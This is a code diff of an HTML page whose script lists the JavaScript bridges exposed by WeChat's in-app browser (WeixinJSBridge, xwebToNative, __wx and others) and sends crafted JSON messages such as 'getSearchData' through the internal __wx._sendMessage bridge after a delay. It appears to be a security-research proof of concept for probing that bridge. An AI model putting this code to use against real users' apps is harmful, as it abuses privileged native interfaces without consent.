@@ -10,22 +10,28 @@
 		}
 	</script>
 	<script>
-	var __wx;
-   	window.addEventListener('load', function(event) {
-   		mylog("document load done");
-  		mylog("[+] Printing Javascript-bridges available");
-  		if(typeof window.WeixinJSBridge !== 'undefined') mylog('WeixinJSBridge');
-    	if(typeof window.WeixinJSContext !== 'undefined') mylog('WeixinJSContext');
-    	if(typeof window.xwebToNative !== 'undefined') mylog('xwebToNative');
-    	if(typeof window.webSearchJSApi !== 'undefined') mylog('webSearchJSApi');
-    	if(typeof window.__wxtag !== 'undefined') mylog('__wxtag');
-    	if(typeof window.CustomFullscreenApi !== 'undefined') mylog('CustomFullscreenApi');
-    	if(typeof window.__wx !== 'undefined') {
-    		__wx = window.__wx;
-    		mylog('__wx');
-    	}
-        	
-		msg_array[0] = JSON.stringify({
+		var __wx;
+	   	window.addEventListener('load', function(event) {
+	   		mylog("document load done");
+	  		mylog("[+] Printing Javascript-bridges available");
+	  		if(typeof window.WeixinJSBridge !== 'undefined') mylog('WeixinJSBridge');
+	    	if(typeof window.WeixinJSContext !== 'undefined') mylog('WeixinJSContext');
+	    	if(typeof window.xwebToNative !== 'undefined') mylog('xwebToNative');
+	    	if(typeof window.webSearchJSApi !== 'undefined') mylog('webSearchJSApi');
+	    	if(typeof window.__wxtag !== 'undefined') mylog('__wxtag');
+	    	if(typeof window.CustomFullscreenApi !== 'undefined') mylog('CustomFullscreenApi');
+	    	if(typeof window.__wx !== 'undefined') {
+	    		__wx = window.__wx;
+	    		mylog('__wx');
+	    	}
+	    });
+  </script>
+  <script>
+  	function mini() 
+  	{
+  		var msg_array = new Array();
+
+  		msg_array[0] = JSON.stringify({
 			"func":"getSearchData",
 			"params":{
 				"searchId":"",
@@ -118,8 +124,15 @@
 			var msgArray = []; msgArray.push(msg_array[i]);
 			var msgArrayString = JSON.stringify(msgArray);
 			__wx._sendMessage(msgArrayString);
-		}
-   	});
-  </script>
+		}  	
+  	}
+
+  	if( typeof __wx !== 'undefined' ) {
+  		mylog("Let's call mini!");
+  		setTimeout(()=> {
+  			mini();
+  		}, 5000);
+  	}
+  </script>		
 </body>
 </html>
